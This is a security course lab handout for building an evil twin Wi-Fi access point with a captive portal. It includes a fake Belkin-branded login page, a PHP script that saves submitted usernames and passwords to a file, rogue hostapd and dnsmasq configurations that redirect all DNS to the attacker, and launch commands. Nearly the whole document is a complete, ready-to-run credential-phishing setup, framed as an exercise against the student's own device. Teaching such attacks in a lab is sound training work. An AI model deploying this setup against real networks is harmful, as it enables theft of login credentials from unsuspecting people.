# Bonus Lab: Advanced Evil Twin with a Captive Portal

## Background

In Lab 12, you explored the concept of creating a software-based access point. We will now take that concept to the next level by building an "Evil Twin" with a captive portal. The goal of a captive portal attack is to trick users into connecting to our malicious AP and then present them with a fake login page to steal their credentials.

We will create an open wireless network that mimics the name of the `Belkin` network. When a user connects, all of their web traffic will be redirected to a fake "Terms of Service" page that we host. This page will require a username and password to "access the internet," and we will capture any credentials entered.

**Objective:** Create an evil twin AP with a captive portal to harvest credentials.
**Target:** An unsuspecting client (e.g., your own phone or the Cisco device).

---

## Step 1: Create the Captive Portal Files

First, we need to create the fake login page and a simple script to log the captured credentials.

1.  Navigate to your home directory.

    ```console
    cd ~
    ```

2.  Create the fake login page. Create a file named `index.html` with the following content. This simple page asks for a username and password and sends it to a `login.php` script.

    ```console
    sudo nano index.html
    ```

    Copy and paste the following HTML:

    ```html
    <!DOCTYPE html>
    <html>
    <head>
        <title>Belkin Network - Accept Terms of Service</title>
        <style>
            body { font-family: sans-serif; background-color: #f4f4f4; }
            .container { width: 300px; margin: 100px auto; padding: 20px; background-color: #fff; border: 1px solid #ddd; }
            input[type=text], input[type=password] { width: 100%; padding: 10px; margin: 5px 0 15px 0; border: 1px solid #ccc; }
            input[type=submit] { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Belkin Network Access</h2>
            <p>Please enter your credentials to accept the terms of service and access the internet.</p>
            <form action="login.php" method="post">
                Username: <input type="text" name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    ```

3.  Create the PHP script to handle the login. Create a file named `login.php`. This script will take the submitted username and password and save them to a file called `credentials.txt`.

    ```console
    sudo nano login.php
    ```

    Copy and paste the following PHP:

    ```php
    <?php
        header("Location: index.html"); // Redirect back to the login page
        $file = 'credentials.txt';
        $username = $_POST['username'];
        $password = $_POST['password'];
        $data = "Username: " . $username . " | Password: " . $password . "\n";
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
        exit();
    ?>
    ```

## Step 2: Configure `hostapd`

Now, create the configuration file for our evil twin access point. It will be an **open** network with the same SSID as the Belkin network.

1.  Create the `hostapd` configuration file.

    ```console
    sudo nano hostapd.conf
    ```

2.  Add the following configuration. **Make sure to set the `ssid` to the exact name of the Belkin network** and choose a channel that is different from the real Belkin network's channel if possible, to minimize interference.

    ```text
    interface=wlan0mon
    driver=nl80211
    ssid=Belkin-Network
    hw_mode=g
    channel=3
    auth_algs=1
    ignore_broadcast_ssid=0
    ```

## Step 3: Configure `dnsmasq`

Next, configure `dnsmasq` to serve as our DHCP and DNS server. The crucial part is the `address` line, which will resolve *all* domain names to our attacker machine's IP address.

1.  Create the `dnsmasq` configuration file.

    ```console
    sudo nano dnsmasq.conf
    ```

2.  Add the following configuration:

    ```text
    interface=wlan0mon
    dhcp-range=10.0.0.10,10.0.0.250,12h
    dhcp-option=3,10.0.0.1
    dhcp-option=6,10.0.0.1
    server=8.8.8.8
    address=/#/10.0.0.1
    ```

## Step 4: Prepare the Attack Environment

We need to set up our network interface and install a web server with PHP capabilities.

1.  Kill interfering processes and set up your monitor interface with a static IP.

    ```console
    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
    sudo ifconfig wlan0mon up 10.0.0.1 netmask 255.255.255.0
    ```

2.  Install PHP, which is needed to run our `login.php` script.

    ```console
    sudo apt-get update
    sudo apt-get install php
    ```

## Step 5: Launch the Attack

Now we will launch all the components in separate terminals.

1.  **Terminal 1: Start `hostapd`**
    Use the configuration file you created.

    ```console
    sudo hostapd hostapd.conf
    ```

2.  **Terminal 2: Start `dnsmasq`**
    Run `dnsmasq` in the foreground to see DHCP and DNS requests.

    ```console
    sudo dnsmasq -C dnsmasq.conf -d
    ```

3.  **Terminal 3: Start the Web Server**
    Use PHP's built-in web server to host our captive portal files.

    ```console
    sudo php -S 10.0.0.1:80
    ```

## Step 6: Test the Captive Portal

Your evil twin network is now live.

1.  Take a client device (like your smartphone) and search for Wi-Fi networks.
2.  Connect to the "Belkin-Network" SSID.
3.  Once connected, open a web browser and try to navigate to any website (e.g., `http://www.google.com`).
4.  You should be automatically redirected to your fake login page.
5.  Enter a fake username and password and click "Login".
6.  Check **Terminal 3** (the PHP server). You should see the POST request to `login.php`.
7.  Check your home directory for a new file, `credentials.txt`. View its contents.

    ```console
    cat credentials.txt
    ```
    You should see the credentials you entered.

## Step 7: Cleanup

Once you are finished, stop all the services and restore your network settings.

1.  Press `CTRL-C` in each of the three terminals.
2.  Take the monitor interface down and stop monitor mode.

    ```console
    sudo ifconfig wlan0mon down
    sudo airmon-ng stop wlan0mon
    ```
3.  Restart the Network Manager service to restore normal Wi-Fi functionality.
    ```console
    sudo service NetworkManager restart
    ```
